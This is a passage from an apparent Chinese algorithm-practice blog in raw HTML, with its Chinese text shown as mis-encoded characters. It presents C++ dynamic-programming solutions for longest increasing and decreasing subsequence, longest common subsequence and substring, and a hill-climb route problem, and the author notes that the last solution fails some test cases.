class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">105</span>;</span><br><span class="line"><span class="keyword">int</span> a[maxn];</span><br><span class="line"><span class="keyword">int</span> d1[maxn];</span><br><span class="line"><span class="keyword">int</span> d2[maxn];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; n)&#123;</span><br><span class="line"><span class="built_in">memset</span>(d1, <span class="number">0</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(d1));</span><br><span class="line"><span class="built_in">memset</span>(d2, <span class="number">0</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(d2));</span><br><span class="line"><span class="built_in">memset</span>(a, <span class="number">0</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(a));</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)&#123;</span><br><span class="line">cin &gt;&gt; a[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)&#123;</span><br><span class="line">d1[i] = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; i; j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(a[j] &lt; a[i])&#123;</span><br><span class="line">d1[i] = <span class="built_in">max</span>(d1[i], d1[j]+<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = n; i &gt;= <span class="number">1</span>; i--)&#123;</span><br><span class="line">d2[i] = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = n; j &gt; i; j--)&#123;</span><br><span class="line"><span class="keyword">if</span>(a[j] &lt; a[i])&#123;</span><br><span class="line">d2[i] = <span class="built_in">max</span>(d2[i], d2[j]+<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)&#123;</span><br><span class="line"><span class="keyword">int</span> tmp = d1[i] + d2[i];</span><br><span class="line">ans = <span class="built_in">max</span>(ans, tmp);</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; n-ans+<span class="number">1</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æœ€é•¿é€’å‡å­åºåˆ—"><a href="#æœ€é•¿é€’å‡å­åºåˆ—" class="headerlink" title="æœ€é•¿é€’å‡å­åºåˆ—"></a>æœ€é•¿é€’å‡å­åºåˆ—</h3><h5 id="é¢˜ç›®æè¿°-45"><a href="#é¢˜ç›®æè¿°-45" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h5><p>è¾“å…¥æ•°å­—nï¼Œå’Œnä¸ªæ•´æ•°ï¼Œè¾“å‡ºè¯¥æ•°å­—ä¸²ä¸­çš„æœ€é•¿é€’å‡åºåˆ—</p><h5 id="è¾“å…¥è¾“å‡ºæ ¼å¼-43"><a href="#è¾“å…¥è¾“å‡ºæ ¼å¼-43" class="headerlink" title="è¾“å…¥è¾“å‡ºæ ¼å¼"></a>è¾“å…¥è¾“å‡ºæ ¼å¼</h5><h6 id="è¾“å…¥æè¿°-45"><a href="#è¾“å…¥æè¿°-45" class="headerlink" title="è¾“å…¥æè¿°:"></a>è¾“å…¥æè¿°:</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è§æ ·ä¾‹</span><br></pre></td></tr></table></figure><h6 id="è¾“å‡ºæè¿°-45"><a href="#è¾“å‡ºæè¿°-45" class="headerlink" title="è¾“å‡ºæè¿°:"></a>è¾“å‡ºæè¿°:</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è§æ ·ä¾‹</span><br></pre></td></tr></table></figure><p>å…ˆå¾—åˆ°æœ€é•¿é€’å‡å­åºåˆ—é•¿åº¦ï¼Œå¹¶ç®—æ¯ä¸€ä¸ªå…ƒç´ çš„ä¸Šä¸€ä¸ªçš„åºå·ï¼›ç„¶åæ‰¾åˆ°d[i = ansçš„å…ƒç´ ä½ç½®ï¼›å†æ ¹æ®preå¾€å‰å¾—åˆ°æœ€é•¿é€’å‡å­åºåˆ—</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">1005</span>;</span><br><span class="line"><span class="keyword">int</span> a[maxn];</span><br><span class="line"><span class="keyword">int</span> d[maxn];</span><br><span class="line"><span class="keyword">int</span> pre[maxn]; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; n)&#123;</span><br><span class="line"><span class="built_in">memset</span>(d, <span class="number">0</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(d));</span><br><span class="line"><span class="built_in">memset</span>(a, <span class="number">0</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(a));</span><br><span class="line"><span class="built_in">memset</span>(pre, <span class="number">0</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(pre));</span><br><span class="line"><span class="keyword">int</span> b[n] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">cin &gt;&gt;a[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">d[i] = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; i; j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(a[j] &gt; a[i])&#123;</span><br><span class="line"><span class="keyword">int</span> tmp = d[j]+<span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>(tmp &gt; d[i])&#123;</span><br><span class="line">d[i] = tmp;</span><br><span class="line">pre[i] = j;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">ans = <span class="built_in">max</span>(ans, d[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//cout &lt;&lt; ans &lt;&lt; endl;</span></span><br><span class="line"><span class="comment">//for(int i = 0; i &lt; n; i++)&#123;</span></span><br><span class="line"><span class="comment">//printf(&quot;%d:%d\n&quot;, d[i], pre[i]);</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="keyword">int</span> t = n<span class="number">-1</span>, l;</span><br><span class="line"><span class="keyword">while</span>(t)&#123;</span><br><span class="line"><span class="keyword">if</span>(d[t] == ans)&#123;</span><br><span class="line">l = t;</span><br><span class="line">&#125;</span><br><span class="line">t--;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//cout &lt;&lt; l &lt;&lt; endl;</span></span><br><span class="line">t = ans<span class="number">-1</span>;</span><br><span class="line"><span class="keyword">for</span>(; l!=<span class="number">0</span>; l = pre[l])&#123;</span><br><span class="line">b[t--] = a[l];</span><br><span class="line">&#125;</span><br><span class="line">b[t] = a[l];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; ans; i++)&#123;</span><br><span class="line">cout &lt;&lt; b[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="æœ€é•¿å…¬å…±å­åºåˆ—"><a href="#æœ€é•¿å…¬å…±å­åºåˆ—" class="headerlink" title="æœ€é•¿å…¬å…±å­åºåˆ—"></a>æœ€é•¿å…¬å…±å­åºåˆ—</h2><p>çŠ¶æ€è½¬ç§»æ–¹ç¨‹ï¼š</p><p><img src="../images/%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230702223636395.png" alt="image-20230702223636395"></p><h3 id="Coincidence"><a href="#Coincidence" class="headerlink" title="Coincidence"></a>Coincidence</h3><h5 id="é¢˜ç›®æè¿°-46"><a href="#é¢˜ç›®æè¿°-46" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h5><p>Find a longest common subsequence of two strings.</p><h5 id="è¾“å…¥è¾“å‡ºæ ¼å¼-44"><a href="#è¾“å…¥è¾“å‡ºæ ¼å¼-44" class="headerlink" title="è¾“å…¥è¾“å‡ºæ ¼å¼"></a>è¾“å…¥è¾“å‡ºæ ¼å¼</h5><h6 id="è¾“å…¥æè¿°-46"><a href="#è¾“å…¥æè¿°-46" class="headerlink" title="è¾“å…¥æè¿°:"></a>è¾“å…¥æè¿°:</h6><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">First <span class="keyword">and</span> <span class="keyword">second</span> <span class="built_in">line</span> <span class="keyword">of</span> <span class="keyword">each</span> input <span class="keyword">case</span> contain <span class="literal">two</span> strings <span class="keyword">of</span> lowercase <span class="keyword">character</span> <span class="keyword">a</span>â€¦z. There are no spaces <span class="keyword">before</span>, inside <span class="keyword">or</span> <span class="keyword">after</span> <span class="keyword">the</span> strings. Lengths <span class="keyword">of</span> strings <span class="built_in">do</span> <span class="keyword">not</span> exceed <span class="number">100.</span></span><br></pre></td></tr></table></figure><h6 id="è¾“å‡ºæè¿°-46"><a href="#è¾“å‡ºæè¿°-46" class="headerlink" title="è¾“å‡ºæè¿°:"></a>è¾“å‡ºæè¿°:</h6><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">For <span class="keyword">each</span> <span class="keyword">case</span>, output k â€“ <span class="keyword">the</span> <span class="built_in">length</span> <span class="keyword">of</span> <span class="keyword">a</span> longest common subsequence <span class="keyword">in</span> <span class="literal">one</span> <span class="built_in">line</span>.</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">105</span>;</span><br><span class="line"><span class="keyword">int</span> d[maxn][maxn];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">string a, b;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; a &gt;&gt; b)&#123;</span><br><span class="line"><span class="built_in">memset</span>(d, <span class="number">0</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(d));</span><br><span class="line"><span class="keyword">int</span> la = a.<span class="built_in">size</span>();</span><br><span class="line"><span class="keyword">int</span> lb = b.<span class="built_in">size</span>();</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i&lt;=la; i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= lb; j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(a[i<span class="number">-1</span>] == b[j<span class="number">-1</span>])&#123;</span><br><span class="line">d[i][j] = d[i<span class="number">-1</span>][j<span class="number">-1</span>]+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">d[i][j] = <span class="built_in">max</span>(d[i<span class="number">-1</span>][j], d[i][j<span class="number">-1</span>]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cout &lt;&lt; d[la][lb] &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æœ€é•¿è¿ç»­å…¬å…±å­åºåˆ—"><a href="#æœ€é•¿è¿ç»­å…¬å…±å­åºåˆ—" class="headerlink" title="æœ€é•¿è¿ç»­å…¬å…±å­åºåˆ—"></a>æœ€é•¿è¿ç»­å…¬å…±å­åºåˆ—</h3><h5 id="é¢˜ç›®æè¿°-47"><a href="#é¢˜ç›®æè¿°-47" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h5><p>Time Limit: 1000 ms<br>Memory Limit: 256 mb</p><p> è¾“å…¥ä¸¤ä¸ªå­—ç¬¦ä¸²s1,s2ã€‚è¾“å‡ºæœ€é•¿è¿ç»­å…¬å…±å­ä¸²é•¿åº¦å’Œæœ€é•¿è¿ç»­å…¬å…±å­ä¸²ã€‚</p><h5 id="è¾“å…¥è¾“å‡ºæ ¼å¼-45"><a href="#è¾“å…¥è¾“å‡ºæ ¼å¼-45" class="headerlink" title="è¾“å…¥è¾“å‡ºæ ¼å¼"></a>è¾“å…¥è¾“å‡ºæ ¼å¼</h5><h6 id="è¾“å…¥æè¿°-47"><a href="#è¾“å…¥æè¿°-47" class="headerlink" title="è¾“å…¥æè¿°:"></a>è¾“å…¥æè¿°:</h6><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">å¤šç»„æ•°æ®è¾“å…¥ã€‚</span><br><span class="line">è¾“å…¥ä¸¤ä¸ªå­—ç¬¦ä¸²<span class="built_in">s1</span>,<span class="built_in">s2</span>ï¼Œé•¿åº¦ä¸å¤§äº<span class="number">100</span>ï¼Œä»¥ç©ºæ ¼éš”å¼€ã€‚</span><br></pre></td></tr></table></figure><h6 id="è¾“å‡ºæè¿°-47"><a href="#è¾“å‡ºæè¿°-47" class="headerlink" title="è¾“å‡ºæè¿°:"></a>è¾“å‡ºæè¿°:</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¾“å‡ºæœ€é•¿è¿ç»­å…¬å…±å­ä¸²é•¿åº¦å’Œæœ€é•¿è¿ç»­å…¬å…±å­ä¸²ã€‚</span><br></pre></td></tr></table></figure><p>è¿™ç§æƒ…å†µçš„çŠ¶æ€è½¬ç§»æ–¹ç¨‹ä¸ºï¼š</p><p><img src="../images/%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230702230322534.png" alt="image-20230702230322534"></p><p>ç„¶åæ¯æ¬¡å¾—åˆ°æœ€é•¿å…¬å…±å­ä¸²è·å–å…¶æœ«å°¾çš„ä¸‹æ ‡ï¼Œå†é€šè¿‡é•¿åº¦å°±å¯æ‰“å°åºåˆ—ï¼ˆæ³¨æ„è¦æœ€åä¸€ä¸ªï¼Œæ‰€ä»¥æœ‰ç­‰å·ï¼‰</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">105</span>;</span><br><span class="line"><span class="keyword">int</span> d[maxn][maxn];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">string a, b;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; a &gt;&gt; b)&#123;</span><br><span class="line"><span class="built_in">memset</span>(d, <span class="number">0</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(d));</span><br><span class="line"><span class="keyword">int</span> la = a.<span class="built_in">size</span>();</span><br><span class="line"><span class="keyword">int</span> lb = b.<span class="built_in">size</span>();</span><br><span class="line"><span class="keyword">int</span> res = <span class="number">0</span>, l, r;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i&lt;=la; i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= lb; j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(a[i<span class="number">-1</span>] == b[j<span class="number">-1</span>])&#123;</span><br><span class="line">d[i][j] = d[i<span class="number">-1</span>][j<span class="number">-1</span>]+<span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>(d[i][j] &gt;= res)&#123;</span><br><span class="line">res = d[i][j];</span><br><span class="line">l = i;</span><br><span class="line">r = j;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">d[i][j] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cout &lt;&lt; res &lt;&lt; endl;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = l - res; i &lt; l; i++)&#123;</span><br><span class="line">cout &lt;&lt;a[i];</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="éª‘è½¦è·¯çº¿"><a href="#éª‘è½¦è·¯çº¿" class="headerlink" title="éª‘è½¦è·¯çº¿"></a>éª‘è½¦è·¯çº¿</h3><h5 id="é¢˜ç›®æè¿°-48"><a href="#é¢˜ç›®æè¿°-48" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h5><p>Tomislavæœ€è¿‘å‘ç°è‡ªå·±çš„èº«æå®Œå…¨èµ°æ ·äº†ï¼Œå¥¹èµ°æ¥¼æ¢¯éƒ½å˜å¾—å¾ˆç´¯ã€‚ä¸€å¤©æ—©ä¸Šå¥¹èµ·æ¥ä»¥åï¼Œå¥¹å†³å®šæ¢å¤å§£å¥½çš„èº«æã€‚å¥¹æœ€å–œæ¬¢çš„è¿åŠ¨æ˜¯éª‘è‡ªè¡Œè½¦ï¼Œå› æ­¤å¥¹å†³å®šåœ¨æœ¬åœ°çš„å°å±±ä¸Šåšä¸€æ¬¡æ—…è¡Œã€‚</p><p>å¥¹éª‘è‡ªè¡Œè½¦çš„è·¯çº¿å¯ä»¥æè¿°ä¸ºNä¸ªæ•°å­—çš„æ•°åˆ—ï¼Œæ¯ä¸ªæ•°å­—è¡¨ç¤ºæ¯ä¸€æ®µè·¯åœ°æµ·æ‹”é«˜åº¦ã€‚Tomislavæœ€æ„Ÿå…´è¶£çš„æ˜¯æœ€é•¿çš„é«˜åº¦ä¸€ç›´ä¸Šå‡çš„å­åºåˆ—ï¼Œå¥¹ç§°è¿™ä¸€æ®µè·¯ä¸ºçˆ¬å¡ï¼ŒTomislavåªæƒ³è€ƒè™‘è¿™æ®µçˆ¬å¡çš„é«˜åº¦å·®ï¼ˆå³å¼€å§‹å’Œæœ€åçš„æ•°å­—çš„å·®è·ï¼‰ï¼Œè€Œä¸æ˜¯ä»€ä¹ˆè·¯ç¨‹é•¿åº¦ã€‚</p><p>ä¸€æ®µçˆ¬å¡è·¯è¢«å®šä¹‰ä¸ºè‡³å°‘ä¸¤ä¸ªè¿ç»­çš„ä¸Šå‡æ•°åˆ—ã€‚ä¾‹å¦‚ï¼Œæˆ‘ä»¬è€ƒè™‘å¦‚ä¸‹è·¯çº¿æ•°åˆ—12 3 5 7 10 6 1 11ï¼Œè¿™é‡Œæœ‰ä¸¤ä¸ªçˆ¬å¡ï¼Œç¬¬ä¸€ä¸ªçˆ¬å¡ï¼ˆ3 5 7 10ï¼‰çš„é«˜åº¦å·®æ˜¯7ï¼Œç¬¬äºŒä¸ªçˆ¬å¡çš„é«˜åº¦å·®æ˜¯10ï¼ˆ1 11ï¼‰ã€‚</p><p>å¸®åŠ©Tomislavè®¡ç®—é«˜åº¦å·®æœ€å¤§çš„çˆ¬å¡çš„é«˜åº¦å·®ã€‚</p><h5 id="è¾“å…¥è¾“å‡ºæ ¼å¼-46"><a href="#è¾“å…¥è¾“å‡ºæ ¼å¼-46" class="headerlink" title="è¾“å…¥è¾“å‡ºæ ¼å¼"></a>è¾“å…¥è¾“å‡ºæ ¼å¼</h5><h6 id="è¾“å…¥æè¿°-48"><a href="#è¾“å…¥æè¿°-48" class="headerlink" title="è¾“å…¥æè¿°:"></a>è¾“å…¥æè¿°:</h6><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">å¤šç»„æµ‹è¯•æ•°æ®è¾“å…¥ã€‚</span><br><span class="line">ç¬¬ä¸€è¡Œæ˜¯ä¸€ä¸ªæ­£æ•´æ•°<span class="built_in">N</span> (<span class="number">1</span>&lt;= <span class="built_in">N</span> &lt;= <span class="number">1000</span>), æè¿°äº†è·¯çº¿æ•°åˆ—ã€‚</span><br><span class="line">ç¬¬äºŒè¡Œæœ‰<span class="built_in">N</span>ä¸ªæ­£æ•´æ•°ï¼Œæ¯ä¸ªæ­£æ•´æ•°<span class="built_in">Pi</span> (<span class="number">1</span>&lt;= <span class="built_in">Pi</span> &lt;= <span class="number">1000</span>)è¡¨ç¤ºç›¸åº”è·¯æ®µçš„æµ·æ‹”é«˜åº¦ã€‚</span><br></pre></td></tr></table></figure><h6 id="è¾“å‡ºæè¿°-48"><a href="#è¾“å‡ºæè¿°-48" class="headerlink" title="è¾“å‡ºæè¿°:"></a>è¾“å‡ºæè¿°:</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ‰€æœ‰çˆ¬å¡ä¸­çš„æœ€å¤§é«˜åº¦å·®ï¼Œå¦‚æœè·¯çº¿æ•°åˆ—é‡Œé¢æ²¡æœ‰çˆ¬å¡ï¼Œå°±è¾“å‡º0ã€‚</span><br></pre></td></tr></table></figure><p>æˆ‘æƒ³çš„æ˜¯ç”¨d[i]æ¥å®šä¹‰åˆ°iä¸ºæ­¢æœ€å¤§çš„é«˜åº¦å·®ï¼Œä½†è¿‡ä¸äº†æ‰€æœ‰ç”¨ä¾‹</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">1005</span>;</span><br><span class="line"><span class="keyword">int</span> a[maxn];</span><br><span class="line"><span class="keyword">int</span> d[maxn];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; n)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i&lt;n; i++)&#123;</span><br><span class="line">cin &gt;&gt; a[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;n; i++)&#123;</span><br><span class="line">d[i] = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; i; j++)&#123;</span><br><span class="line"><span class="comment">//cout &lt;&lt; d[j] &lt;&lt; &quot;vs&quot; &lt;&lt; a[i] - a[j] &lt;&lt; endl;</span></span><br><span class="line"><span class="keyword">if</span>(d[i] &lt; d[j] || d[i] &lt; (a[i] - a[j])) d[i] = <span class="built_in">max</span>(d[j], a[i] - a[j]);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">res = <span class="built_in">max</span>(res, d[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//for(int i = 0; i &lt;n; i++)&#123;</span></span><br><span class="line"><span class="comment">//cout &lt;&lt; d[i] &lt;&lt; &quot; &quot;;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//cout &lt;&lt; endl;</span></span><br><span class="line">cout &lt;&lt; res &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h3 id="éª¨ç‰Œ-åŠ å¼ºç‰ˆ"><a href="#éª¨ç‰Œ-åŠ å¼ºç‰ˆ" class="headerlink" title="éª¨ç‰Œ - åŠ 